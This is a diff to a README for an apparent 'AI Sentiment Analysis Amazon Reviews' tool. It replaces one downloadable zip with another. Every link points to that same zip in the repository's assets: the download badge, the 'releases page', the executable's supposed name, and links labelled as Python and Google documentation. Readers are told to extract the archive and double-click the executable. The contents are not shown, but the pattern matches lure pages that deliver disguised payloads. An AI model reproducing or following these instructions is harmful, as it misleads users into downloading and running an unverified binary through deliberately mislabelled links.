@@ -6,7 +6,7 @@ Welcome to the AI-Sentiment-Analysis-Amazon-Reviews project! This software helps
 
 ## 📥 Download Now!
 
-[![Download AI-Sentiment-Analysis-Amazon-Reviews](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip)
+[![Download AI-Sentiment-Analysis-Amazon-Reviews](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip)
 
 ## 📄 Overview
 
@@ -31,7 +31,7 @@ Follow these simple steps to download and install the application:
 
 1. **Visit the Download Page**
    
-   Go to our releases page [here](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip). 
+   Go to our releases page [here](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip). 
 
 2. **Choose the Latest Version**
 
@@ -47,7 +47,7 @@ Follow these simple steps to download and install the application:
 
 5. **Run the Application**
 
-   Find the executable file (it could be named `https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip` or similar) and double-click it. Your application will start.
+   Find the executable file (it could be named `https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip` or similar) and double-click it. Your application will start.
 
 ## 🎓 How to Use
 
@@ -79,7 +79,7 @@ Once the application is running, you will see a simple user interface. Here’s 
 
 If you encounter issues while using the application, consider these tips:
 
-- **Check for Updates:** Always ensure you have the latest version from [the releases page](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip).
+- **Check for Updates:** Always ensure you have the latest version from [the releases page](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip).
 - **Python Compatibility:** Ensure you have the correct version of Python installed.
 - **Internet Connection:** Confirm that your internet connection is stable for downloading components.
 
@@ -98,8 +98,8 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 To learn more about AI, machine learning, and natural language processing, try these resources:
 
-- [Python Official Documentation](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip)
-- [Machine Learning by Google](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip)
-- [Natural Language Processing with Python](https://raw.githubusercontent.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/main/assets/A_Amazon_Analysis_Sentiment_Reviews_2.0.zip)
+- [Python Official Documentation](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip)
+- [Machine Learning by Google](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip)
+- [Natural Language Processing with Python](https://github.com/ikbalrestufauzi/AI-Sentiment-Analysis-Amazon-Reviews/raw/refs/heads/main/assets/Amazon-Reviews-Sentiment-A-Analysis-v2.1.zip)
 
 Thank you for choosing AI-Sentiment-Analysis-Amazon-Reviews! Enjoy exploring the insights from Amazon reviews with this user-friendly tool.
